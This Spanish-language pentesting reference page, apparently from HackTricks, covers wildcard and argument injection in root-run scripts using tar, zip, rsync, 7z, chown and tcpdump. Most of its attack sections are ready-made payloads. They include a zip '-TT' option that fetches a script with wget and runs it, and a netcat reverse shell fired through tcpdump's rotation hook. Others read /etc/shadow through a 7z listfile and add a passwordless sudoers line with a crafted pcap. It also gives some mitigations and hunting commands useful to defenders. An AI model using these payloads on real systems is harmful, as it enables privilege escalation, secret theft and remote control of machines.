# Trucos adicionales con comodines

{{#include ../../banners/hacktricks-training.md}}

> La **inyección de argumentos** mediante comodines (también llamados *globs*) ocurre cuando un script con privilegios ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un comodín sin comillas, como `*`.  
> Como el shell expande el comodín **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede crear nombres de archivo que empiecen con `-`, para que se interpreten como **opciones en lugar de datos** y así introducir sigilosamente flags arbitrarios o incluso comandos.<sup>[[6]](#references)</sup>
> Esta página recopila las primitivas más útiles, las investigaciones recientes y las detecciones modernas para 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permisos de un archivo de referencia** abusando del flag `--reference` cuando un comodín expande un nombre de archivo que parece una opción.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Cuando root ejecuta posteriormente algo como:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

La opción expandida `--reference=.drf.php` prevalece sobre el propietario/modo explícitos, lo que hace que los archivos coincidentes hereden los metadatos de `.drf.php` (y, con la configuración anterior, permite que el atacante los modifique).<sup>[[6]](#references)</sup>

Revisa todo el helper privilegiado, no solo su línea `chown`. Un cambio de propietario puede eliminar los bits set-user-ID o set-group-ID; [POSIX deja el caso privilegiado definido por la implementación](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Un `chmod` posterior en el mismo trabajo puede restaurar esos bits en los archivos seleccionados anteriormente, cambiando el resultado. Antes de considerar esto una vía de escalada de privilegios ejecutable, confirma el orden real de los comandos, el directorio del glob modificable, el archivo afectado y el comportamiento de los enlaces, el propietario y modo resultantes, y si el montaje permite set-user-ID. Si no se puede leer el helper, se desconocen esos pasos.

*PoC y herramienta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).<sup>[[7]](#references)</sup>
Consulta también el clásico artículo de DefenseCode para más detalles.<sup>[[6]](#references)</sup>

---

## GNU `cp` en un script privilegiado

Revisa los scripts que se ejecutan como root y copian desde el directorio de trabajo elegido por quien los invoca mediante un glob sin prefijo, por ejemplo, `cp .version * /etc/app/staged/`, cuando un usuario con menos privilegios puede crear nombres de archivo allí. GNU `cp` puede interpretar como opción un nombre de archivo expandido por `*` que empiece con un guion. Su opción `--preserve=mode` puede conservar los bits de modo del origen en una copia nueva, y `--target-directory` puede cambiar el destino de la copia. Para confirmar cualquiera de estos efectos, hay que verificar la rama exacta del script, el estado del destino, los privilegios efectivos, la política del sistema de archivos y el comportamiento de GNU `cp`; el texto de una regla de sudo o de un script por sí solo no demuestra una escalada. Anteponer `./` a los operandos o terminar el análisis de opciones con `--` evita que GNU `cp` interprete de este modo los nombres que empiezan con un guion ([FAQ de GNU Coreutils](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [manual de `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Ejecuta comandos arbitrarios aprovechando la función **checkpoint** de GNU tar y las acciones de checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.<sup>[[10]](#references)</sup>

### Advertencia sobre la sustitución del compresor en bsdtar / macOS

El `tar` predeterminado en versiones recientes de macOS (basado en `libarchive`) *no* proporciona la interfaz `--checkpoint` de GNU tar, pero bsdtar documenta **--use-compress-program** para seleccionar un compresor externo.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, este selecciona `sh` a través del `PATH` de la víctima y bsdtar lo inicia como compresor.<sup>[[11]](#references)</sup> Esto demuestra option injection, pero no constituye por sí solo una primitiva fiable para ejecutar comandos arbitrarios: un nombre de archivo creado mediante un comodín no puede contener `/`, y bsdtar proporciona datos del archivo en lugar de un comando de shell elegido por el atacante. Para lograr la ejecución de código también se necesita un ejecutable controlable que se resuelva a través de `PATH` u otro canal de argumentos que permita especificar un programa útil.

---

## rsync

`rsync` permite sobrescribir el shell remoto o el binario remoto mediante flags de línea de comandos como `-e` y `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Si root archiva posteriormente el directorio con `rsync -az * backup:/srv/`, el flag inyectado puede ejecutar un shell mediante el mecanismo de remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).

---

## 7-Zip / 7z / 7za

Incluso cuando el script con privilegios antepone *defensivamente* `--` al wildcard (para impedir el análisis de opciones), la CLI de 7-Zip acepta **archivos de listas de archivos** si se antepone `@` al nombre del archivo. Al combinar esto con un symlink, puedes *exfiltrar archivos arbitrarios*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Si root ejecuta algo como:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y abortará, **imprimiendo el contenido en stderr**.<sup>[[13]](#references)</sup>

Esto sigue funcionando con `-- *` porque la CLI de 7-Zip acepta explícitamente tanto nombres de archivo normales como `@listfiles` como argumentos posicionales, por lo que un nombre de archivo literal como `@root.txt` sigue tratándose de forma especial.<sup>[[13]](#references)</sup>

---

## zip

Existen dos primitivas muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un comodín o enumerando nombres sin `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE mediante un hook de prueba: `-T` habilita la «prueba del archivo» y `-TT <cmd>` reemplaza el programa de prueba por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que empiecen por `-`, divide las opciones entre nombres de archivo distintos para que funcione el análisis de opciones cortas.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notas
- NO pruebes con un único nombre de archivo como `'-T -TT <cmd>'`: las opciones cortas se analizan carácter por carácter y fallará. Usa tokens separados, como se muestra.<sup>[[3]](#references)</sup>
- Si la aplicación elimina las barras de los nombres de archivo, descarga desde un host/IP sin ruta (ruta predeterminada `/index.html`), guarda el archivo localmente con `-O` y luego ejecútalo.<sup>[[3]](#references)</sup>
- Puedes depurar el análisis con `-sc` (muestra los argv procesados) o `-h2` (más ayuda) para entender cómo se procesan tus tokens.<sup>[[3]](#references)</sup>

Ejemplo (comportamiento local en zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Exfiltración de datos/leak: Si la capa web muestra el stdout/stderr de `zip` (algo común con wrappers ingenuos), los flags inyectados como `--help` o los errores por opciones incorrectas aparecerán en la respuesta HTTP, confirmando la inyección de línea de comandos y ayudando a ajustar el payload.<sup>[[3]](#references)</sup>

---

## Candidatos adicionales para la inyección de opciones

Cuando un wrapper con privilegios expande un directorio modificable mediante un wildcard, vale la pena comprobar estos hooks de opciones documentados.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binario | Flag para abusar | Efecto |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Pasa una cadena de comando a un shell |
| `git`   | `-c core.sshCommand=<cmd>` | Usa `<cmd>` en lugar de SSH para Git fetch/push |
| `scp`   | `-S <program>` | Usa un programa de conexión alternativo compatible con SSH |

Estas primitivas son comprobaciones útiles más allá de los clásicos *tar/rsync/zip*.

---

## Búsqueda de wrappers y jobs vulnerables

Estudios de casos recientes y guías de detección muestran que la inyección de wildcard/argv ya no es solo un problema de **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> La misma clase de bug sigue apareciendo en:

- funciones web que "descargan todo como zip/tar" desde directorios de carga controlados por un atacante
- shells de depuración de appliances/proveedores que exponen un wrapper de **tcpdump** con campos de nombre de archivo/filtro controlados por un atacante
- jobs de backup o rotación que ejecutan `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` en directorios modificables

Comandos útiles para el triage (la invocación de `pspy` usa sus flags documentados para eventos de procesos/archivos e intervalos).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Heurísticas rápidas:

- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za`, porque `@listfiles` se analizan por separado.<sup>[[13]](#references)</sup>
- Para `zip`, busca wrappers que enumeren directamente nombres de archivo controlados por el usuario; la división de opciones cortas (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un glob del shell.<sup>[[2]](#references)[[3]](#references)</sup>
- Para `tcpdump`, presta especial atención a los wrappers que te permiten controlar **los nombres de los archivos de salida**, **la configuración de rotación** o los argumentos de **reproducción de archivos de captura**.<sup>[[18]](#references)</sup>

---

## Hooks de rotación de tcpdump (-G/-W/-z): RCE mediante inyección de argv en wrappers

Cuando un shell restringido o un wrapper del proveedor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (p. ej., un parámetro de «nombre de archivo») sin aplicar comillas o validaciones estrictas, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar la cantidad de archivos) y `-z <cmd>` (comando posterior a la rotación) permite la ejecución arbitraria de comandos como el usuario que ejecuta tcpdump (a menudo root en dispositivos).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Requisitos previos:

- Puedes influir en el `argv` que se pasa a `tcpdump` (p. ej., mediante un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- El wrapper no sanea los espacios ni los tokens del campo de nombre de archivo que empiezan por `-`.<sup>[[4]](#references)</sup>

PoC clásica (ejecuta un script de reverse shell desde una ruta con permisos de escritura).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Detalles:

- `-G 1` rota cada segundo, y `-W 1` se detiene tras un archivo rotado; la captura debe recibir un paquete coincidente antes de la rotación.<sup>[[18]](#references)</sup>
- `-z <cmd>` ejecuta el comando post-rotación una vez por rotación y pasa como argumento la ruta del savefile cerrado; asegúrate de que el manejo de argumentos del script/intérprete coincida con tu payload.<sup>[[18]](#references)</sup>

Variantes sin medios extraíbles:

- Si tienes cualquier otra primitiva para escribir archivos (p. ej., un wrapper de comandos independiente que permita la redirección de salida), coloca tu script en una ruta conocida y activa `-z /path/script.sh`; haz que el script invoque `/bin/sh` por sí mismo si es necesario.<sup>[[18]](#references)</sup>
- Si un wrapper del proveedor permite elegir la ruta del archivo rotado, audita el control de esa ruta solo en combinación con un comando post-rotación que interprete su argumento savefile; el control de la ruta por sí solo no ejecuta el contenido del archivo.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump con comodines/argumentos adicionales → escritura/lectura arbitrarias y root

Ejemplo de anti-patrón de sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

La regla deja varias opciones disponibles en el parser documentado de tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- El glob `*` y los patrones permisivos solo restringen el primer argumento de `-w`. `tcpdump` acepta varias opciones `-w`; prevalece la última.<sup>[[3]](#references)[[18]](#references)</sup>
- La regla no fija otras opciones, así que se permiten `-Z`, `-r`, `-V`, etc.<sup>[[3]](#references)[[18]](#references)</sup>

A continuación se documentan las primitivas relevantes.<sup>[[3]](#references)[[18]](#references)</sup>
- Sobrescribir la ruta de destino con un segundo `-w` (el primero solo satisface sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal dentro del primer `-w` para escapar del árbol restringido.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Forzar la propiedad de los archivos de salida con `-Z root` (crea archivos propiedad de root en cualquier ubicación).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Escritura de contenido arbitrario al reproducir un PCAP manipulado mediante `-r` (p. ej., para añadir una línea a sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Crea un PCAP que contenga la carga ASCII exacta y escríbelo como root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Lectura arbitraria de archivos/leak de secretos con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error suelen repetir las líneas, provocando un leak de contenido.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: inyección de argumentos de zip a RCE + escalada de privilegios por configuración incorrecta de sudo en tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Cadena completa de explotación](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Posible shell detectado mediante inyección de comodines](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Regreso al futuro: comodines de Unix descontrolados (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Invocación de `chown` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Invocación de `chmod` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Puntos de control de GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manual de bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manual de rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaxis de la línea de comandos de 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manual de flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentación de configuración de Git](https://git-scm.com/docs/git-config)
- [17] [Manual de `scp` de OpenBSD](https://man.openbsd.org/scp)
- [18] [Manual de tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
